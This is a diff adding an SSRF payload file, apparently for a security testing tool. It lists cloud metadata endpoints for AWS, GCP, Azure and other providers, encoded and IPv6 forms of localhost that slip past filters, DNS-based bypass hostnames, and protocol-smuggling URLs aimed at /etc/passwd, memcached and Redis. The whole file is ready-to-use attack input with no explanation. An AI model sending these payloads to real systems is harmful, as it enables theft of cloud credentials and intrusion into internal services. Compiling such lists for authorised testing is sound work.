@@ -1,0 +1,38 @@
+# payloads/ssrf.yml
+# Advanced SSRF vectors including IPv6, Octal/Hex encoding, and modern cloud metadata
+
+metadata:
+  aws_v1: "http://169.254.169.254/latest/meta-data/"
+  aws_v2: "http://169.254.169.254/latest/api/token"
+  gcp: "http://metadata.google.internal/computeMetadata/v1/"
+  digital_ocean: "http://169.254.169.254/metadata/v1.json"
+  azure: "http://169.254.169.254/metadata/instance?api-version=2017-04-02"
+  oracle: "http://192.0.0.192/latest/"
+  alibaba: "http://100.100.100.200/latest/meta-data/"
+  kubernetes: "https://kubernetes.default.svc/"
+
+localhost_bypasses:
+  # Standard
+  - "http://127.0.0.1:80"
+  - "http://localhost:8080"
+  # IP Encoding (Decimal, Hex, Octal)
+  - "http://2130706433"          # 127.0.0.1 in Decimal
+  - "http://0x7f000001"          # 127.0.0.1 in Hex
+  - "http://0177.0.0.1"          # 127.0.0.1 in Octal
+  # IPv6 Variations
+  - "http://[::1]"
+  - "http://[0000::1]"
+  - "http://[::ffff:127.0.0.1]"
+  # DNS Resolution Bypasses
+  - "http://127.0.0.1.nip.io"
+  - "http://localtest.me"
+  - "http://spoofed.burpcollaborator.net"
+  # Zero IP
+  - "http://0/"
+  - "http://0.0.0.0/"
+
+protocols:
+  - "file:///etc/passwd"
+  - "dict://127.0.0.1:11211/stat"
+  - "gopher://127.0.0.1:6379/_INFO"
+  - "ftp://127.0.0.1:21/"
